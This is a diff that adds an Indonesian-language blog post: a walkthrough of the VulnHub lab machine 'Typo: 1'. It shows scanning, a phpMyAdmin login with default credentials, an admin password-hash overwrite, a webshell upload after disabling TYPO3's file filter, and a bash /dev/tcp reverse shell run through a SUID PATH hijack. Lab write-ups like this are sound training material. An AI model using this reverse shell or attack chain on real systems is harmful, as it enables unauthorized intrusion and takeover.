@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>[VULNHUB] Typo: 1 | bl33dz:~#</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="[VULNHUB] Typo: 1" />
+<meta name="author" content="bl33dz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Vulnhub Typo: 1" />
+<meta property="og:description" content="Vulnhub Typo: 1" />
+<link rel="canonical" href="http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html" />
+<meta property="og:url" content="http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html" />
+<meta property="og:site_name" content="bl33dz:~#" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-20T00:00:00+07:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"[VULNHUB] Typo: 1","dateModified":"2020-05-20T00:00:00+07:00","datePublished":"2020-05-20T00:00:00+07:00","url":"http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html"},"author":{"@type":"Person","name":"bl33dz"},"description":"Vulnhub Typo: 1","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/old/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/old/assets/favicon.png" />
+  <link type="application/atom+xml" rel="alternate" href="https://bl33dz.github.io/feed.xml" title="bl33dz:~#" />
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/old/">bl33dz:~#<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://www.facebook.com/bl33dz"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/bl33dz"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="https://s.gravatar.com/avatar/2c42898e592207a08fefe63c6231c78a?s=256" class="author-avatar" />
+bl33dz<br> ordinary people<br> interested in linux and programming
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">[VULNHUB] Typo: 1</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/old/tag/vulnhub/">vulnhub</a>
+      
+      <a class="tag" href="/old/tag/linux/">linux</a>
+      
+      <a class="tag" href="/old/tag/medium/">medium</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 20 May 2020</div>
+  
+  <div class="post-description">Vulnhub Typo: 1</div>
+  
+  <p>Ketemu lagi di artikel baru saya, artikel ini ditulis karena kebetulan saya sedang tidak ada kerjaan lain dan sedang dibuat pusing oleh machine <a href="https://www.hackthebox.eu/home/machines/profile/252">Travel</a> pada HackTheBox. Maka dari itu saya iseng iseng liat machine di vulnhub dan menemukan machine <a href="https://www.vulnhub.com/entry/typo-1,472/">Typo: 1</a>.</p>
+
+<p>Machine ini sendiri menggunakan operasi sistem Linux dan tugas saya menemukan cara mendapatkan root flag pada machine ini. Setelah saya download file .ova machine ini, saya langsung deploy pada VirtualBox dan saya run machine tersebut.</p>
+
+<p><img src="/assets/images/typo1.png" alt="typo1" /></p>
+
+<p>Terlihat IP Machine ini adalah <code class="highlighter-rouge">192.168.56.109</code> (tergantung virtualbox) maka saya menambahkan IP tersebut ke <code class="highlighter-rouge">/etc/hosts</code> dengan domain <code class="highlighter-rouge">typo.local</code> seperti yang diperintahkan pada deskripsi machine. Setelah itu saya melakukan scanning dengan nmap dan mendapatkan output seperti berikut.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/typo# nmap -sV -sC -oN typo.nmap typo.local
+[REDACTED]
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cd:dc:8f:24:51:73:54:bc:87:62:a2:e6:ed:f1:c1:b4 (RSA)
+|   256 a9:39:a9:bf:b2:f7:01:22:65:07:be:15:48:e8:ef:11 (ECDSA)
+|_  256 77:f5:a9:ff:a6:44:7c:9c:34:41:f1:ec:73:5e:57:bd (ED25519)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-generator: TYPO3 CMS
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-title: Armour: Infosec
+|_Requested resource was http://typo.local/en/
+8000/tcp open  http    Apache httpd 2.4.38
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Did not follow redirect to http://typo.local
+8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+8081/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+[REDACTED]
+</code></pre></div></div>
+
+<p>Kita bisa melihat beberapa port yang terbuka, namun saya tertarik dengan port 80. Ketika saya buka <a href="http://typo.local/">http://typo.local/</a> akan ter-redirect ke <a href="http://typo.local/en/">http://typo.local/en/</a> dan hanya menampilkan <code class="highlighter-rouge">HELLO user</code>. Karena web ini menggunakan <a href="https://typo3.org/">Typo3</a> saya mencoba melihat path <code class="highlighter-rouge">/typo3</code> dan menampilkan tampilan seperti berikut.</p>
+
+<p><img src="/assets/images/typo2.png" alt="typo2" /></p>
+
+<p>Saya mencoba mencari mencari berbagai exploit namun ternyata tidak ada yang cocok, akhirnya saya coba melakukan bruteforce directory dan hanya menemukan <code class="highlighter-rouge">/fileadmin</code> dan itu adalah directory milik typo3. Maka saya mencoba melakukan bruteforce pada port lain.</p>
+
+<p>Port 8080:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/typo# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://typo.local:8080/FUZZ
+[REDACTED]
+index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
+phpinfo.php             [Status: 200, Size: 95848, Words: 4749, Lines: 1179]
+[REDACTED]
+</code></pre></div></div>
+
+<p>Port 8081:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/typo# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://typo.local:8081/FUZZ
+[REDACTED]
+index.html              [Status: 200, Size: 6, Words: 1, Lines: 2]
+phpmyadmin              [Status: 301, Size: 320, Words: 20, Lines: 10]
+[REDACTED]
+</code></pre></div></div>
+
+<p>Untuk port 8000 sendiri tidak saya lakukan bruteforce karena semua request akan diarahkan ke port 80. Dari result diatas saya tetap tidak menemukan sesuatu menarik kecuali <code class="highlighter-rouge">phpmyadmin</code>. Awalnya saya stuck cukup lama dan akhirnya saya coba coba login di phpmyadmin dengan user “root” dan password “” namun ternyata tidak diperbolehkan login tanpa password. Kemudian saya mencoba lagi dengan <del>ilmu dukun</del> user “root” dan password “root” ternyata dapat login pada phpmyadmin tersebut.</p>
+
+<p><img src="/assets/images/typo3.png" alt="typo3" /></p>
+
+<p>Saya langsung inisiatif melihat tabel user dan mencoba merubah password admin, namun ternyata saya tidak tahu jenis hash yang digunakan. Setelah mencari cari ternyata web tersebut menggunakan hash <code class="highlighter-rouge">argon2id</code>. Saya pun mencoba melakukan generate pada web <a href="https://argon2.online/">https://argon2.online/</a> menggunakan option seperti berikut.</p>
+
+<p><img src="/assets/images/typo4.png" alt="typo4" /></p>
+
+<p>Setelah mendapatkan hasil hash dari password <code class="highlighter-rouge">bleedz123</code> maka saya melakukan update pada tabel <code class="highlighter-rouge">be_users</code>.</p>
+
+<p><img src="/assets/images/typo5.png" alt="typo5" /></p>
+
+<p>Saya mencoba login pada CMS Typo3 di port 80 dengan menggunakan user <code class="highlighter-rouge">admin</code> dan password <code class="highlighter-rouge">bleedz123</code>. Ternyata saya dapat login dan diarahkan ke dashboard admin. Disini saya langsung mencoba melakukan upload file namun gagal.</p>
+
+<p><img src="/assets/images/typo6.png" alt="typo6" /></p>
+
+<p>Setelah membaca baca dokumentasi ternyata ada cara untuk menghapus filter extension pada Typo3 dengan mengosongkan fileDenyPattern pada Global Typo3 Options. (<a href="https://docs.typo3.org/m/typo3/guide-security/8.7/en-us/GuidelinesIntegrators/GlobalTypo3Options/Index.html">Reference</a>).</p>
+
+<p><img src="/assets/images/typo7.png" alt="typo7" /></p>
+
+<p>Maka saya tinggal melakukan upload dengan langkah sebelumnya dan file saya akan ter-upload pada <code class="highlighter-rouge">http://typo.local/fileadmin/bejak.php</code>. Saya langsung mencoba lakukan backconnect dengan fitur yang sudah tersedia pada webshell b374k.</p>
+
+<p><img src="/assets/images/typo8.png" alt="typo8" /></p>
+
+<p>Tentunya sebelum saya backconnect saya sudah menyiapkan listener dengan command seperti berikut.</p>
+
+<p><img src="/assets/images/typo9.png" alt="typo9" /></p>
+
+<p>Lalu setelah akhirnya mendapatkan interactive shell dan melakukan magic netcat agar lebih stabil saya mencoba melakukan enumerasi menggunakan <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a>. Dan saya mencurigai 2 file suid yang terdapat pada server tersebut.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-] SUID files:
+[REDACTED]
+-rwsr-sr-x 1 root root 6883 Mar 30 17:13 /usr/local/bin/apache2-restart
+-rwsr-sr-x 1 root root 2963219 Feb 13 13:00 /usr/local/bin/phpunit
+</code></pre></div></div>
+
+<p>Awalnya saya mencoba phpunit dengan membuat file <code class="highlighter-rouge">/tmp/evil/revTest.php</code> dan mencoba run <code class="highlighter-rouge">phpunit evil</code> namun ternyata saya hanya mendapatkan user www-data bukan root.</p>
+
+<p>Akhirnya saya mencoba mengidentifikasi file <code class="highlighter-rouge">/usr/local/bin/apache2-restart</code> karena secara default file tersebut tidaklah ada.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@typo:/tmp$ file /usr/local/bin/apache2-restart 
+/usr/local/bin/apache2-restart: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=7f141086cfbe35713b5871941d2fdb74795d89ab, not stripped
+
+www-data@typo:/tmp$ strings /usr/local/bin/apache2-restart 
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+[REDACTED]
+</code></pre></div></div>
+
+<p>Ternyata binary tersebut hanya menjalankan command <code class="highlighter-rouge">service apache2 start</code> dimana pada kasus seperti ini kita dapat melakukan privilege escalation dengan mengubah variable PATH. Pertama siapkan listener dan jalankan command seperti berikut ini.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@typo:/tmp$ vim service
+www-data@typo:/tmp$ chmod +x service 
+www-data@typo:/tmp$ cat service 
+#!/bin/bash
+/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1
+www-data@typo:/tmp$ export PATH=/tmp
+www-data@typo:/tmp$ /usr/local/bin/apache2-restart
+</code></pre></div></div>
+
+<p>Setelah itu listener kita akan mendapat interactive shell dan kita dapat melihat flag root.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/typo# nc -vlp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.1] from typo.local [192.168.56.109] 52994
+root@typo:/tmp# export PATH=/bin:/usr/bin:/usr/local/bin 
+export PATH=/bin:/usr/bin:/usr/local/bin
+root@typo:/tmp# cd /root
+cd /root
+root@typo:/root# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@typo:/root# ls
+ls
+proof.txt
+root@typo:/root# cat proof.txt
+cat proof.txt
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3aap2ff0LbLYZrF
+</code></pre></div></div>
+
+<p>Menurut pendapat saya machine ini sendiri memerlukan banyak enumerating terutama pada tiap port dan kita perlu memiliki sedikit <del>ilmu dukun</del> insting untuk menebak password PHPMyAdmin.</p>
+
+<p>Sekian walkthrough yang bisa saya buat, jika ada yang kurang jelas bisa ditanyakan melalui telegram atau facebook saya and see you next article.</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/05/hackthebox-bitlab.html">
+            [HTB] Bitlab
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/04/web-joints.html">
+            [JOINTS2020] Writeup Category Web
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2019/12/07/hackthebox-wall.html">
+            [HTB] Wall
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/old/tag/ctf/" class="set-1">ctf</a> <a href="/old/tag/easy/" class="set-1">easy</a> <a href="/old/tag/hackthebox/" class="set-2">hackthebox</a> <a href="/old/tag/linux/" class="set-5">linux</a> <a href="/old/tag/medium/" class="set-4">medium</a> <a href="/old/tag/rce/" class="set-1">rce</a> <a href="/old/tag/vulnhub/" class="set-2">vulnhub</a> <a href="/old/tag/web/" class="set-1">web</a> <a href="/old/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+  	<center><a href="https://www.hackthebox.eu/home/users/profile/67190"><img src="https://www.hackthebox.eu/badge/image/67190" alt="Hack The Box"></a></center><br><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
